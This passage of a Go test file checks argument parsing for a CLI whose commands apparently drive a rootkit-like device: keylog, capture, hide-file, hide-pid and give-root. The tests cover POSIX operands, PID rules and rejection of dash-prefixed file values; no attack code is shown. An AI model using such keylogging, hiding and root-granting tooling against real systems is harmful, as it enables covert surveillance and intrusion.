	for _, cmd := range []string{"stats", "list", "doctor", "watch",
		"keylog", "capture", "hide-file", "give-root", "reset",
		"unknown-cmd"} {
		if !deviceRequired(cmd) {
			t.Errorf("deviceRequired(%q) = false, want true", cmd)
		}
	}
}

func TestPosixOperandArgs(t *testing.T) {
	// Bare dash-leading operand -> rejected, error names the token.
	_, err := posixOperandArgs([]string{"-foo"})
	if err == nil || !strings.Contains(err.Error(), "unknown option: -foo") {
		t.Errorf("bare -foo: err = %v", err)
	}
	// The error teaches the escape.
	if !strings.Contains(err.Error(), "'-- -foo'") {
		t.Errorf("error must teach the escape, got: %v", err)
	}
	// The POSIX escape hands the value through verbatim.
	rest, err := posixOperandArgs([]string{"--", "-foo"})
	if err != nil || len(rest) != 1 || rest[0] != "-foo" {
		t.Errorf("-- -foo: rest = %v, err = %v", rest, err)
	}
	// Lone "-" is a POSIX operand, verbatim.
	rest, err = posixOperandArgs([]string{"-"})
	if err != nil || len(rest) != 1 || rest[0] != "-" {
		t.Errorf("-: rest = %v, err = %v", rest, err)
	}
	// Negative numbers stay operands (argparse positional rule).
	for _, num := range []string{"-5", "-3.5", "-0"} {
		rest, err = posixOperandArgs([]string{num})
		if err != nil || len(rest) != 1 || rest[0] != num {
			t.Errorf("%s: rest = %v, err = %v", num, rest, err)
		}
	}
	// No escape, normal operand: verbatim.
	rest, err = posixOperandArgs([]string{"secret.txt"})
	if err != nil || len(rest) != 1 || rest[0] != "secret.txt" {
		t.Errorf("plain name mangled: %v, %v", rest, err)
	}
	// Empty args: verbatim.
	rest, err = posixOperandArgs(nil)
	if err != nil || len(rest) != 0 {
		t.Errorf("nil args mangled: %v, %v", rest, err)
	}
	// give-root -5 keeps the self-contract through the full parser.
	pid, err := parseGiveRootPID(mustPosix(t, "-5"))
	if err != nil || pid != -5 {
		t.Errorf("give-root -5: pid = %d, err = %v", pid, err)
	}
	// hide-pid -- -5 is still rejected by the VALUE rule (>= 1).
	if _, err := parsePIDArgs([]string{"--", "-5"}, "hide-pid"); err == nil {
		t.Errorf("hide-pid -- -5 must fail the >= 1 rule")
	}
}

// mustPosix is a test helper: posixOperandArgs or fail.
func mustPosix(t *testing.T, args ...string) []string {
	t.Helper()
	rest, err := posixOperandArgs(args)
	if err != nil {
		t.Fatalf("posixOperandArgs(%v): %v", args, err)
	}
	return rest
}

func TestFlagValuesRejectLeadingDash(t *testing.T) {
	for _, bad := range [][]string{
		{"--output", "--follow"},
		{"--output", "-foo"},
		{"--output", "--"},
		{"--follow", "--output", "-x"},
	} {
		if _, err := parseKeylogArgs(bad); err == nil {
			t.Errorf("parseKeylogArgs(%v) must reject a dash-prefixed FILE", bad)
		}
	}
	for _, bad := range [][]string{
		{"--out", "--json"},
		{"--out", "-x"},
		{"--out", "--"},
	} {
		if _, _, err := parseCaptureArgs(bad); err == nil {
			t.Errorf("parseCaptureArgs(%v) must reject a dash-prefixed FILE", bad)
		}
	}
	// The error names the offending token (no silent eating).
	_, _, err := parseCaptureArgs([]string{"--out", "--json"})
	if err != nil && !strings.Contains(err.Error(), "--json") {
		t.Errorf("error must name the offending token, got: %v", err)
	}
	// A dash INSIDE the path (not leading) stays valid.
	opts, err := parseKeylogArgs([]string{"--output", "cap-1.log"})
	if err != nil || opts.outputPath != "cap-1.log" {
		t.Errorf("normal path mangled: %+v, %v", opts, err)
	}
	// The documented escape works: ./-foo is a real path.
	opts, err = parseKeylogArgs([]string{"--output", "./-foo"})
	if err != nil || opts.outputPath != "./-foo" {
		t.Errorf("./- escape mangled: %+v, %v", opts, err)
	}
}
